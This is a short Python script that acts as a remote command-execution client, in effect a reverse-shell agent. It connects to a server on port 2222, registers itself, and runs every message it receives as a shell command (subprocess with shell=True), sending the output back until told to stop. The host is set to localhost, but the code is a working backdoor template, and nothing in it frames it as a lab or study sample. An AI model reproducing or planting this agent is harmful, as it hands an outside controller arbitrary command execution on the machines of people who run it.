import socket
import subprocess

SERVER_HOST = "127.0.0.1"
CLIENT_HOST = "127.0.0.1"
PORT = 2222

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Connect to the server
    s.connect((SERVER_HOST, PORT))

    # Creating and sending a registration request to the server (The request is the client's host).
    registration_request = CLIENT_HOST
    s.sendall(bytes(registration_request, encoding='utf-8'))

    # Running until "stop" is sent from the server.
    while True:

        # Wait, and recieve the message from the server.
        message = s.recv(1024).decode('utf-8')

        # If the message is stop, stop the session.
        if message == "stop":
            break

        # If the message exist, execute it.
        if message:
            print(message)
            try:
                result = subprocess.run(message.split(), capture_output=True, text=True, shell=True)
            except:
                # Handle errors
                s.sendall(bytes("Not a valid command", encoding='utf-8'))
                continue

            # Send the stdout, and stderr to the server.
            response = result.stdout.strip() + "\n" + result.stderr.strip()
            s.sendall(bytes(response, encoding='utf-8'))
        else:
            print(f"Error with recieving message")

print("Done")